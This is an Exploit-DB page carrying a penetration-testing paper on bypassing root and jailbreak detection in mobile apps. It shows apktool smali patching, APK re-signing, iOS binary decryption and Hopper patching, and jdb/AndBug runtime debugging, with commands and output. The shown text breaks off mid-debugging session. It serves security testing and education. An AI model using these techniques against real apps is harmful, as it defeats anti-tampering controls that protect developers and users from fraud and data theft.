<!DOCTYPE html>
<html lang="en">

<head>
    <script src="/js/core/jquery.min.js"></script>
    <meta charset="utf-8"/>
    <meta name="csrf-token" content="y8tUBtoVlyXyvDCtMOJKmEoHBYTmEBSx7L8hCtpX">

    <link rel="manifest" href="/manifest.json">

    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
    <link rel="icon" type="image/png" href="/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>

    
    <title>Mobile Application Hacking Diary Ep.2</title>

    <!-- Prism code colouring -->
    <link rel="stylesheet" href="/css/prism.css">

    <!-- prism.js syntax highlighter -->
    <script src="/js/clipboard.js"></script>
    <script src="/js/prism.js"></script>

    <link rel="canonical" href="https://www.exploit-db.com/papers/44145">
    <meta name="description" content="Mobile Application Hacking Diary Ep.2">
    <meta name="keywords" content="Multiple,papers">
    <meta name="author" content="CWH Underground">

    <meta property="og:title" content="Mobile Application Hacking Diary Ep.2">
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://www.exploit-db.com/exploits/44145">
    <meta property="og:image" content="https://www.exploit-db.com/images/spider-orange.png" />
    <meta property="og:site_name" content="Exploit Database" />
    <meta property="article:published_time" content="2018-02-19" />
        <meta property="article:author" content="CWH Underground" />
    <meta property="article:authorUrl" content="https://www.exploit-db.com/?author=1275" />

    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="@ExploitDB">
    <meta name="twitter:title" content="Mobile Application Hacking Diary Ep.2">
    <meta name="twitter:creator" content="@ExploitDB">
    <meta name="twitter:image:src" content="https://www.exploit-db.com/images/spider-orange.png">


    <link rel="alternate" type="application/rss+xml" title="Exploit-DB.com RSS Feed" href="/rss.xml">

    <meta
            content='width=device-width, initial-scale=1.0, shrink-to-fit=no'
            name='viewport'/>

    <meta property="og:title" content="Offensive Security&#8217;s Exploit Database Archive">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://www.exploit-db.com/">

    <meta name="theme-color" content="#ec5e10">

    <script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="5cfe7093-608f-4f4e-80b4-925b1e9d949f"
            data-georegions="{'region':'US-06','cbid':'6abbf59f-78fd-4d8f-ac7e-b57c0f046bbf'}" data-blockingmode="auto"
            type="text/javascript">
    </script>

    <script type="text/javascript">
        window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
        ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );

        ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"
            type="text/javascript">

    </script>

    <!-- Material Design Icons https://materialdesignicons.com/ -->
    <link href="/css/materialdesignicons.min.css" media="all" rel="stylesheet" type="text/css"/>

    <!-- Theme CSS Files -->
    <link href="/css/bootstrap.min.css" rel="stylesheet"/>

    <link href="/css/now-ui-dashboard.css" rel="stylesheet"/>

    <link href="/css/app.css" rel="stylesheet"/>

    <style>
        .rbtn {
            border: 2px solid white;
            border-radius: 20px;
            color: black;
            padding: 8px;
            cursor: pointer;
        }

        .rsuccess {
            border-color: white;
            color: white;
        }

        .rsuccess:hover {
            background-color: white;
            color: #165283;
        }
        .rprimary {
            border-color: #ca4f0c;
            color: #ca4f0c;
        }

        .rprimary:hover {
            background-color: #ca4f0c;
            color: white;
        }
    </style>
</head>

<body class=" sidebar-mini">

<div class="wrapper">

    
    <div class="sidebar" data-color="orange">

    <div class="logo">

        
        <a href="/" class="simple-text logo-mini">
            &nbsp;<img src="/images/spider-white.png" alt="Exploit Database">
        </a>

        
        
            <a href="/" class="simple-text logo-normal">
                Exploit Database
            </a>

        
    </div>

    <div class="sidebar-wrapper">

        <ul class="nav">

            
            <li class="">

                <a href="/">
                    <i class="mdi mdi-ladybug mdi-24px"></i>
                    <p>Exploits</p>
                </a>

            </li>

            
            <li class="">

                <a href="/google-hacking-database">
                    <i class="mdi mdi-search-web mdi-24px"></i>
                    <p title="Google Hacking Database">GHDB</p>
                </a>

            </li>

            
            <li class="active">

                <a href="/papers">
                    <i class="mdi mdi-file-outline mdi-24px"></i>
                    <p>Papers</p>
                </a>

            </li>

            
            <li class="">

                <a href="/shellcodes">
                    <i class="mdi mdi-chip mdi-24px"></i>
                    <p>Shellcodes</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">



                <li>

                    <a class="nav-link" href="/search">
                        <i class="mdi mdi-database-search mdi-24px"></i>
                        <p title="Search Exploit-Database">Search EDB</p>
                    </a>

                </li>



            <li>

                
                <a class="nav-link" href="/searchsploit">
                    <i class="mdi mdi-book-open-page-variant mdi-24px"></i>
                    <p>SearchSploit Manual</p>
                </a>

            </li>

            <li>

                
                <a class="nav-link" href="/submit">
                    <i class="mdi mdi-upload mdi-24px"></i>
                    <p>Submissions</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">

            <li>

                <a data-toggle="collapse" href="#onlineTraining" aria-expanded="false">
                    <i class="mdi mdi-school mdi-24px"></i>
                    <p>Online Training <b class="caret"></b></p>
                </a>

                <div class="collapse " id="onlineTraining">
                    <ul class="nav">

                        <li>
                            <a href="/pentest-training-with-kali-linux">
                                <span class="sidebar-mini-icon">PWK</span>
                                <span class="sidebar-normal" title="Penetration Testing with Kali Linux"> PEN-200 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/wireless-attacks-training">
                                <span class="sidebar-mini-icon">WiFu</span>
                                <span class="sidebar-normal" title="Offensive Security Wireless Attacks"> PEN-210 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/evasion-techniques-breaching-defenses">
                                <span class="sidebar-mini-icon">ETBD</span>
                                <span class="sidebar-normal" title="Evasion Techniques and Breaching Defenses"> PEN-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/advanced-web-attacks">
                                <span class="sidebar-mini-icon">AWAE</span>
                                <span class="sidebar-normal" title="Advanced Web Attacks and Exploitation"> WEB-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/windows-user-mode-exploit-development">
                                <span class="sidebar-mini-icon">WUMED</span>
                                <span class="sidebar-normal" title="Windows User Mode Exploit Development"> EXP-301 </span>
                            </a>
                        </li>
                    </ul>

                </div>

            </li>

<!--
            <li>

                <a class="nav-link" href="#" data-toggle="modal" data-target="#osresources">
                    <i class="mdi mdi-link-variant mdi-24px"></i>
                    <p>Offsec Resources</p>
                </a>

            </li>
-->
        </ul>

    </div>

</div>

    <div class="main-panel">

        
        <nav class="navbar navbar-expand-lg navbar-transparent  navbar-absolute
  bg-primary">

    <div class="container-fluid">

        <div class="navbar-wrapper">

            <div class="navbar-toggle">
                <button type="button" class="navbar-toggler" aria-label="Toggle Navigation">
                    <span class="navbar-toggler-bar bar1"></span>
                    <span class="navbar-toggler-bar bar2"></span>
                    <span class="navbar-toggler-bar bar3"></span>
                </button>
            </div>

            
            <a class="navbar-brand" href="/">
                <img src="/images/edb-banner-logo-white.png" height="60" alt="Exploit Database">
            </a>

        </div>

        
        <div class="collapse navbar-collapse justify-content-end" id="navigation">

            <ul class="navbar-nav">

                
                    

                        
                           
                           

                            
                            
                                
                            
                        

                        

                            
                                
                            

                            
                               
                                                     
                                
                            

                            
                                
                            

                        
                    
                

                
                    

                        
                            
                            
                                
                            
                        

                    
                

                <li class="nav-item">

                    
                    <a class="nav-link" href="/exploit-database-statistics" aria-label="Exploit Database Statistics">
                        <i class="mdi mdi-chart-bar-stacked mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">Stats</span>
                        </p>
                    </a>

                </li>

                <li class="nav-item dropdown">

                    
                    <a class="nav-link dropdown-toggle" href="/"
                       id="navbarDropdownMenuLink" data-toggle="dropdown"
                       aria-haspopup="true" aria-expanded="false" aria-label="Site Information">

                        <i class="mdi mdi-information-outline mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">About Us</span>
                        </p>
                    </a>

                    <div class="dropdown-menu dropdown-menu-right"
                         aria-labelledby="navbarDropdownMenuLink">

                        <a class="dropdown-item" href="#" data-toggle="modal" data-target="#about" aria-label="About Exploit-DB">
                            About Exploit-DB
                        </a>

                        <a class="dropdown-item" href="/history" aria-label="Exploit-DB History">
                            Exploit-DB History
                        </a>

                        <a class="dropdown-item" href="/faq" aria-label="FAQ">
                            FAQ
                        </a>

                    </div>

                </li>

                
                                    <li class="nav-item">

                        <a class="nav-link" href="#" data-toggle="modal" data-target="#search" aria-label="Search Exploit-DB">
                            <i class="mdi mdi-database-search mdi-24px"></i>
                            <p>
                                <span class="d-lg-none d-md-block">Search</span>
                            </p>
                        </a>

                    </li>

                
            </ul>

        </div>

    </div>

</nav>

        
        
    <div class="panel-header panel-header-sm"></div>

    <div class="content">

        <div class="row">

            <div class="col-md-12">

                
                <div class="card">

                    <div class="card-body">

                        <div class="row justify-content-md-center">

                            
                            <h1 class="card-title text-secondary text-center" style="font-size: 2.5em;">
                                Mobile Application Hacking Diary Ep.2
                            </h1>

                        </div>

                        
                        <div class="ml-2 mr-2">

                            <div class="row">

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                EDB-ID:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                44145
                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                CVE:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                                                                                        N/A

                                                                
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>EDB Verified:</strong>
                                                <i class="mdi mdi-24px mdi-close"
                                                   style="color: #ec5e10">
                                                </i>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Author:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?author=1275">
                                                                    CWH Underground
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Type:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?type=papers">
                                                                    papers
                                                                </a>

                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>Paper: </strong>
                                                <a href="/download/44145" data-toggle="tooltip" data-placement="top"
                                                   title="Download" aria-label="Download Paper 44145">
                                                    <i class="mdi mdi-download mdi-24px text-primary"></i>
                                                </a>
                                                &nbsp; / &nbsp;
                                                <a href="/raw/44145" data-toggle="tooltip" data-placement="top"
                                                   title="View Raw" aria-label="View Raw 44145">
                                                    <i class="mdi mdi-code-braces mdi-24px text-primary"></i>
                                                </a>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Platform:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?platform=multiple">
                                                                    Multiple
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Published:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                2018-02-19
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                
                                                <strong>Vulnerable App:</strong>

                                                
                                            </div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <div class="row">

                                <div class="btn-group ml-3">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/44139" aria-label="View Previous Paper"
                                       data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                        <i class="mdi mdi-arrow-left mdi-36px"></i>
                                    </a>

                                </div>


                                <div class="col">

                                    <div class="btn-group float-right">

                                        <a class="btn btn-primary btn-fab btn-icon btn-round"
                                           href="/papers/44193" aria-label="View Next Paper"
                                           data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                            <i class="mdi mdi-arrow-right mdi-36px"></i>
                                        </a>

                                    </div>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                
                <div class="card">

                    <div class="card-body">

                        
                        <pre><code class="language-txt" style="white-space: pre-wrap;">|=--------------------------------------------------------------------=|
|=------------=[ Mobile Application Hacking Diary Ep.2]=--------------=|
|=------------------------=[ 18 February 2018 ]=----------------------=|
|=----------------------=[  By CWH Underground  ]=--------------------=|
|=--------------------------------------------------------------------=|


######
 Info
######

Title	: Mobile Application Hacking Diary Ep.2
Author	: ZeQ3uL and diF
Team    : CWH Underground
Date	: 2018-02-18


##########
 Contents
##########

  [0x00] - Introduction

  [0x01] - The Watcher

    [0x01a] - Patch&#039;em All
    [0x01b] - Break then Go
    [0x01c] - Hook on the fly
    [0x01d] - No root can gain

  [0x02] - Roof &amp; Tunnel

    [0x02a] - You shall(not) pass
    [0x02b] - You shall(not) see

  [0x03] - Special Thx


#######################
 [0x00] - Introduction
#######################
     _________________
    /            __   \
    |           (__)  |
    |                 |		We gonna hack this !!, Oh just kidding...
    | .-----.   .--.  |
    | |     |  /    \ |
    | &#039;-----&#039;  \    / |
    |           |  |  |
    | LI LI LI  |  |  |
    | LI LI LI  |  |  |Oo
    | LI LI LI  |  |  |`Oo
    | LI LI LI  |  |  |  Oo
    |           |  |  |   Oo
    | .------. /    \ |   oO
    | |      | \    / |   Oo
    | &#039;------&#039;  &#039;-oO  |   oO
    |          .---Oo |   Oo
    |          ||  ||`Oo  oO
    |          |&#039;--&#039;| | OoO
    |          &#039;----&#039; |
    \_________________/

Nowadays, the mobile apps are getting stronger, they armed with more controls and multiple defense mechanisms. The rise of security libraries/guidelines/standard make the apps (looks) more secure. Hence, us, as a tester, cannot simply do the testing only with the traditional techniques e.g. that we published on previous paper (https://www.exploit-db.com/papers/26620/) anymore (cuz hackers won&#039;t too).

This paper is the narrative and the explanation of our penetration testing techniques from the real world as a case study of mobile applications. Each chapter contains various techniques to bypass the implemented security features on the application (e.g. Root detection, SSL Pinning, End-to-end encryption) that may guide you for an idea to conduct pentest a mobile application.

&quot;This is not going to go the way you think.&quot; - Luke Skywalker

Let&#039;s Begin! :))


######################
 [0x01] - The Watcher
######################

    Root detection become a basic protection which can disallow attacker to access application storage, process and memory, and sensitive information. Without root detection, attacker can use various tools to bypass SSL pinning, modify the encrypted traffic over TLS, subvert business logic or even increase game gems without purchasing on a game application.

    There are many automated tools (e.g. Root Cloak Plus, tsprotector) which can bypass root detection.
    Q: What if dev know these tools and implement the detection ?
    A: We need to manually analyze the detection mechanism to bypass without using these tools.
    Therefore, this chapter will show you how to bypass root detection in various techniques instead of using automated tools.

    ++++++++++++++++++++++++
     [0x01a] - Patch&#039;em All
    ++++++++++++++++++++++++

        The first technique we would like to introduce is patching the binary using disassembling, modifying the binary and re-packaging the app in order to modify the app behavior permanently. This chapter will be divided into 2 platforms which are iOS and Android.

        +++++++++++
        + Android +
        +++++++++++

            In order to understand the root detection logic, we need to decompile the app from application package (APK) then analyze its logic in Java languages. There are many tools that can do this task (e.g. Jadx, dex2jar-jdgui) but we propose Bytecode Viewer (https://github.com/Konloch/bytecode-viewer). It contains many decompilers (Krakatau, FernFlower, Procyon and CFR) which will show us the completed Java source code matching with original source code.

            We noticed some method with named &quot;checkRoot()&quot; which declared on MainActivity class as shown below:

            -----------------MainActivity.class--------------
            ...
            RootWine rootWine;
            public void checkRoot()
             {
                this.rootWine = new RootWine(this);
                if (this.rootWine.isRooted()) {
                  //Pop-up toast message then app will not continue
                }
                for (;;) {
                  return;
                  //App will continue
                }
             }
             ...
            -------------------------------------------------

            Once the targeted method was identified, we could use apktool to disassemble the app package into smali files.

            -------------------------------------------------
            zeq3ul@home:~/Desktop$ java -jar apktool.jar d vulnapp.apk
            I: Using Apktool 2.3.1 on vulnapp.apk
            I: Loading resource table...
            ...
            I: Copying original files...
            -------------------------------------------------

            MainActivity.smali was accessed for analyzing by specifying targeted method which is &quot;checkRoot()&quot;. The snippet of smali code is shown below:

            ------------------MainActivity.smali-------------
            # virtual methods
            .method public checkRoot()V
            ...
            invoke-virtual {v0}, Lcom/johny/rootwine/RootWine;-&gt;isRooted()Z
            move-result v0
            if-eqz v0, :cond_0
            //Pop-up toast message then app will not continue
            :cond_0
            //App will continue
            .end method
            -------------------------------------------------

            As you can see, the checkRoot() method uses library called &quot;RootWine&quot; which uses isRooted() to check whether the app is running on root device or not. Then, the result will be checked on &quot;if-eqz&quot; instruction in the condition below:
            - If the return value(v0) from isRooted() method is &quot;1&quot;, app will skip to &quot;cond_0&quot; location which will lead app to continue working
            - If the return value(v0) from isRooted() method is &quot;0&quot;, app will not continue

            We could modify the app logic by adding &quot;if-nez v0, :cond_0&quot;. The app will be forced to &quot;cond_0&quot; location whether the app is running on root device or not. The approaches for re-packging and signing the app are shown as the following:
            - Using apktool to build new app
            - Signing the app using &quot;Apk Sign&quot; (https://github.com/appium/sign) which can automatically sign an apk with the Android test certificate that embed public and private keys within jar.

            -------------------------------------------------
            zeq3ul@home:~/Desktop$ java -jar apktool.jar b vulnapp
            I: Using Apktool 2.3.1
            I: Checking whether sources has changed...
            I: Smaling smali folder into classes.dex...
            ...
            I: Building apk file...
            I: Copying unknown files/dir...
            zeq3ul@home:~/Desktop$ cd vulnapp/dist/
            zeq3ul@home:~/Desktop/vulnapp/dist/$ java -jar sign.jar vulnapp.apk
            zeq3ul@home:~/Desktop/vulnapp/dist/$ adb install vulnapp.s.apk
            -------------------------------------------------

            We could use this app package(vulnapp.s.apk) on any root device to conduct further attack !!

        +++++++++++
        +   iOS   +
        +++++++++++

            By default, apps distributed via the app store are protected from reverse engineering via code encryption. The way to obtain the decrypted code is dumping it from memory while the app is running which can be done using Clutch2 or dumpdecrypted (http://cydia.radare.org/debs/) on jail-broken device. The dumpdecrypted result is shown below:

            -------------------------------------------------
            root# DYLD_INSERT_LIBRARIES=dumpdecrypted.dylib /var/mobile/Containers/Bundle/Application/DC9F742C-D630-4813-8F06-25CD5AA5C611/VulnApp.app/VulnApp
            mach-o decryption dumper

            DISCLAIMER:This tool is only meant for security research purposes, not for application crackers.

            [+] Found encrypted data at address 00002000 of length 1826816 bytes - type 1.
            [+] Opening /private/var/mobile/Containers/Bundle/Application/DC9F742C-D630-4813-8F06-25CD5AA5C611/VulnApp.app/VulnApp for reading.
            [+] Reading header
            [+] Detecting header type
            [+] Executable is a FAT image - searching for right architecture
            [+] Correct arch is at offset 2408224 in the file
            [+] Opening VulnApp.decrypted for writing.
            [-] Failed opening. Most probably a sandbox issue. Trying something different.
            [+] Opening /private/var/mobile/Containers/Bundle/Application/DC9F742C-D630-4813-8F06-25CD5AA5C611/tmp/VulnApp.decrypted for writing.
            [+] Copying the not encrypted start of the file
            [+] Dumping the decrypted data into the file
            [+] Copying the not encrypted remainder of the file
            [+] Closing original file
            [+] Closing dump file
            -------------------------------------------------

            Once the app had been decrypted, Static analysis tools (e.g. classdump, Hopper) were used to analyze application logic. We used classdump for extracting all of the runtime information stored in the binary in order to identify class/method name that might be used for Jailbreak detection as shown below:

            -------------------------------------------------
            root# ./class-dump  /var/mobile/Containers/Bundle/Application/DC9F742C-D630-4813-8F06-25CD5AA5C611/tmp/VulnApp.decrypted

            ...
            @interface JailSpot : UIViewController
            {
            }
            - (_Bool)isJailbroken;
            - (void)didReceiveMemoryWarning;
            - (void)viewDidLoad;
            - (id)initWithNibName:(id)arg1 bundle:(id)arg2;
            @end
            ...
            -------------------------------------------------

            From the result, we could notice &quot;isJailbroken&quot; method, which belonged to &quot;JailSpot&quot; class, had a boolean type. This would be the class/method that used to check jailbreaking status referred to name. Therefore, we could analyze further by using reverse-engineering tool such as Hopper to determine application logic.

            The tool of choice was Hoppers. It can disassemble fat mach-o binary, do the patching and generate a new executable for us. First we open the executable then nagivated to the target method we found from classdump then used the CFG mode to analyze the control flow graph (Hopper also has an option to generate pseudo-code for the method. But for this specific case, we found that it was easier to analyze from CFG view). From the graph view, the flow shown that the method check for common files/directories that normally found on a jailbroken device then it checked whether or not the file could be written under /private/ (which required root priv to do so). After all the long list of checks it arrived at the following blocks before return.

                               | orr        w8, w22, w25                         |
                               | orr        w8, w8, w26                          |
                               | cmp        w8, #0x0                             |
                               | b.eq       loc_100009294                        |
                               \-------------------------------------------------/
                                                       t f
                                                       | \--------------\
                            /-------------------------/                 |
                            |                                           |
  /---------------------------------------------------\    /-------------------------\
  | loc_10009294:                                     |    | movz     w0, #0x0       |
  | orr    w0, wzr, #0x1 ; CODE XREF=sub100007940+6444|    | b        loc_10009298   |
  \---------------------------------------------------/    \-------------------------/
                            |                                           |
                            \------------------\    /-------------------/
                                               |    |
                      /---------------------------------------------------------------\
                      | loc_10009298:                                                 |
                      | ldp      x29, x30, [sp, #0x120] ; CODE XREF=sub_100007940+6452|
                      | ldp      x20, x19, [sp, #0x110]                               |
                      | ldp      x22, x21, [sp, #0x100]                               |
                      | ldp      x24, x23, [sp, #0xf0]                                |
                      | ldp      x26, x25, [sp, #0xe0]                                |
                      | ldp      x28, x27, [sp, #0xd0]                                |
                      | add      sp, sp, #0x130                                       |
                      | ret                                                           |
                      \---------------------------------------------------------------/

            This means the method simply return true (0x01) if any checks failed and return false (0x00) if all checks are passed. So we can try to patch the logic here to bypass the validations and allow us to run application on a jailbroken device.
             
            To begin we need to identify the location to patch. Obviously, the block at the location loc_100009294 seems to be the interesting one as it generate the return value of true. As we identified the location that we could try to patch, we began the patch using Hopper with the option &quot;Modify -&gt; Assemble Instruction...&quot;. The option can generate a new instruction and replace the current instruction for us and what we did was:

            /-------------------------\      /--------------------\
            | orr     w0, wzr, #0x1   |-----&gt;| movz    w0, #0x0   |
            \-------------------------/      \--------------------/

            After successfully patched the binary, we generated new binary (the new one will only be an aarch64 mach-o) with option &quot;File -&gt; Produce New Executable...&quot; then choose to replace current binary of the application. Finally, we installed the application using IPA Installer and found that we could successfully run the application on a jail-broken device. Great!

    +++++++++++++++++++++++++
     [0x01b] - Break then Go
    +++++++++++++++++++++++++

        Another technique which can be done on runtime is debugging. This chapter will show you the approach for debugging the app on Android app. In order to debug the Android app, &quot;android:debuggable=&quot;true&quot;&quot; must be set on AndroidManifest.xml within Android package (apk) so we need to disassemble the app using apktool, add the debuggable flag into AndroidManifest.xml then re-package and sign the app.

        -------------------------------------------------
        zeq3ul@home:~/Desktop$ java -jar apktool.jar d vulnapp.apk
        I: Using Apktool 2.3.1 on vulnapp.apk
        I: Loading resource table...
        ...
        I: Copying original files...
        zeq3ul@home:~/Desktop$ cd vulnapp/
        zeq3ul@home:~/Desktop/vulnapp$ vim AndroidManifest.xml
        ...    // Adding android:debuggable=&quot;true&quot; under &lt;application&gt; tag
        zeq3ul@home:~/Desktop$ cd ..
        zeq3ul@home:~/Desktop$ java -jar apktool.jar b vulnapp
        I: Using Apktool 2.3.1
        I: Checking whether sources has changed...
        I: Smaling smali folder into classes.dex...
        ...
        I: Building apk file...
        I: Copying unknown files/dir...
        zeq3ul@home:~/Desktop$ cd vulnapp/dist/
        zeq3ul@home:~/Desktop/vulnapp/dist/$ java -jar sign.jar vulnapp.apk
        zeq3ul@home:~/Desktop/vulnapp/dist/$ adb install vulnapp.s.apk
        -------------------------------------------------

        With debugging mode features, we were able to can inject our own code to execute it in the context of the vulnerable app process. The recommended tools are AndBug (https://github.com/swdunlop/AndBug) and Java Debugger (jdb). The AndBug is a wrapper around JDWP which allow us to identify/trace the class and method, then we can use jdb to set the breakpoint on specific class/method in order to analyze and modify app process.

        -------------------------------------------------
        zeq3ul@home:~/Desktop$ adb shell ps -x | grep -i &quot;vulnapp&quot;
        u0_a66    1859  57    224432 29428 ffffffff b6ecc5cc S com.example.vulnapp (u:1381, s:277)
        zeq3ul@home:~/Desktop$ andbug shell -p 1859
        ## AndBug (C) 2011 Scott W. Dunlop &lt;swdunlop@gmail.com&gt;
        &gt;&gt; classes com.example.vulnapp
        ## Loaded Classes
           -- com.example.vulnapp.LibraryProvider
           -- com.example.vulnapp.Extend_Main
           -- com.example.vulnapp.Extend_Main$1
           -- com.example.vulnapp.MainActivity
        &gt;&gt; ct com.example.vulnapp.MainActivity
        ## Setting Hooks
           -- Hooked com.example.vulnapp.MainActivity
        &gt;&gt; ## trace thread &lt;1&gt; main        (running suspended)
           -- com.example.vulnapp.MainActivity.checkRoot()V:0
              -- this=Lcom/example/vulnapp/MainActivity; &lt;831928579104&gt;
           ...
        -------------------------------------------------

        As the result, AndBug was able to hook into app process, identify loaded clasess using &quot;classes&quot; command on current activity and trace method on specified class using &quot;ct&quot; command. The app had been opened then &quot;com.example.vulnapp.MainActivity.checkRoot()&quot; was identified to check root status. Java decompiler was used to decompile the app in order to identify app logic in Java language; the isRooted() method came from RootWine library which belonged to &quot;com.johny.rootwine&quot; package.

        -----------------MainActivity.class--------------
        ...
        RootWine rootWine;
        public void checkRoot()
          {
          this.rootWine = new RootWine(this);
             if (this.rootWine.isRooted()) {
                //Pop-up toast message then app will not continue
             }
             for (;;) {
                return;
                //App will continue
             }
           }
        ...
        -------------------------------------------------

        Hence, we could also specify library package on AndBug to ensure which class and method will be used for checking root status.

        -------------------------------------------------
        zeq3ul@home:~/Desktop$ andbug shell -p 1859
        ## AndBug (C) 2011 Scott W. Dunlop &lt;swdunlop@gmail.com&gt;
        &gt;&gt; classes com.johny.rootwine
        ## Loaded Classes
           -- com.johny.rootwine.util.QLog
           -- com.johny.rootwine.Const
           -- com.johny.rootwine.RootWine
        &gt;&gt; ct com.johny.rootwine.RootWine
        ## Setting Hooks
           -- Hooked com.johny.rootwine.RootWine
        &gt;&gt; ## trace thread &lt;1&gt; main        (running suspended)
           -- com.johny.rootwine.RootWine.&lt;init&gt;(Landroid/content/Context;)V:0
              -- this=Lcom/johny/rootwine/RootWine; &lt;831930596104&gt;
           ...
        ## trace thread &lt;1&gt; main        (running suspended)
           -- com.johny.rootwine.RootWine.isRooted()Z:0
              -- this=Lcom/johny/rootwine/RootWine; &lt;831930596104&gt;
           ...
        ## trace thread &lt;1&gt; main        (running suspended)
           -- com.johny.rootwine.RootWine.detectRootManagementApps()Z:0
              -- this=Lcom/johny/rootwine/RootWine; &lt;831930596104&gt;
           ...
        ## trace thread &lt;1&gt; main        (running suspended)
           -- com.johny.rootwine.RootWine.isAnyPackageFromListInstalled(Ljava/util/List;)Z:0
              -- this=Lcom/johny/rootwine/RootWine; &lt;831930596104&gt;
              -- packages=Ljava/util/ArrayList; &lt;831930576248&gt;
           ...
        ## trace thread &lt;1&gt; main        (running suspended)
           -- com.johny.rootwine.RootWine.detectPotentiallyDangerousApps()Z:0
              -- this=Lcom/johny/rootwine/RootWine; &lt;831930596104&gt;
           ...
        ## trace thread &lt;1&gt; main        (running suspended)
           -- com.johny.rootwine.RootWine.checkForBinary(Ljava/lang/String;)Z:0
              -- this=Lcom/johny/rootwine/RootWine; &lt;831930596104&gt;
              -- filename=su
           ...
        -------------------------------------------------

        From the result, &quot;com.johny.rootwine.RootWine&quot; class was traced and identified that isRooted(), which was used to check root status, was the first method. We could analyze further by accessing &quot;com.johny.rootwine.RootWine&quot; class through decompiler.

        -----------------RootWine.class------------------
        ...
        public boolean isRooted()
          {
            if ((detectRootManagementApps()) || (detectPotentiallyDangerousApps()) || (checkForBinary(&quot;su&quot;)) || (checkForBinary(&quot;busybox&quot;)) || (checkForDangerousProps()) || (checkForRWPaths()) || (detectTestKeys()) || (checkSuExists()) || (checkForRootNative())) {}
            for (boolean bool = true;; bool = false) {
              return bool;
            }
          }
        ...
        -------------------------------------------------

        Combining between AndBug and Java Decompiler let us know which class/method we should hook into. The next step we used jdb by starting with forwarding app process number to specific tcp port then we could use jdb to attach into app process for set breakpoint on specific method.

        -------------------------------------------------
        zeq3ul@home:~/Desktop$ adb forward tcp:1337 jdwp:1859
        zeq3ul@home:~/Desktop$ jdb -attach localhost:1337
        Set uncaught java.lang.Throwable
        Set deferred uncaught java.lang.Throwable
        Initializing jdb ...
        &gt; stop in com.johny.rootwine.RootWine.isRooted
        Set breakpoint com.johny.rootwine.RootWine.isRooted
        &gt;
        Breakpoint hit: &quot;thread=&lt;1&gt; main&quot;, com.johny.rootwine.RootWine.isRooted(), line=43 bci=0
        &lt;1&gt; main[1] step
        Step completed: &lt;1&gt; main[1] &quot;thread=&lt;1&gt; main&quot;, com.johny.rootwine.RootWine.detectRootManagementApps(), line=76 bci=0
        &lt;1&gt; main[1] step
        Step completed: &quot;thread=&lt;1&gt; main&quot;, com.johny.rootwine.RootWine.detectRootManagementApps(), line=87 bci=0
        &lt;1&gt; main[1]
        ...
        &lt;1&gt; main[1] step
        Step completed: &quot;thread=&lt;1&gt; main&quot;, com.johny.rootwine.RootWine.checkForBinary(), line=170 bci=0
        &lt;1&gt; main[1] locals
        Method arguments:
        f = instance of java.io.File(id=831931279824)
        Local variables:
        filename = &quot;su&quot;
        pathsArray = instance of java.lang.String[11] (id=831930532976)
        result = false
        path = &quot;/system/xbin/&quot;
        completePath = &quot;/system/xbin/su&quot;
        fileExists = true
